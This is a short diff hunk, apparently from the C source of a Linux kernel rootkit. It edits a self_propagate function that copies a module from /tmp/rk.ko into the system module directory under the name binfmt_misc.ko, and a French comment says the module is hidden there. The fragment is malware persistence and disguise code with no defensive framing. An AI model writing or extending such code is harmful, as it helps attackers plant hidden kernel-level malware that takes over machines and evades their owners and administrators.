@@ -668,8 +668,8 @@ static void self_propagate(void)
     uts = utsname();
     if (!uts) return;
 
-    // Source : Chemin local de l'archive (Attention : Chemin en dur)
-    snprintf(src_path, sizeof(src_path), "/tmp/rk_test.ko");
+    // Source
+    snprintf(src_path, sizeof(src_path), "/tmp/rk.ko");
     
     // Destination : Chemin système où le module doit être caché
     snprintf(dst_path, sizeof(dst_path), "/lib/modules/%s/%s/binfmt_misc.ko", uts->release, PERSIST_DIR);
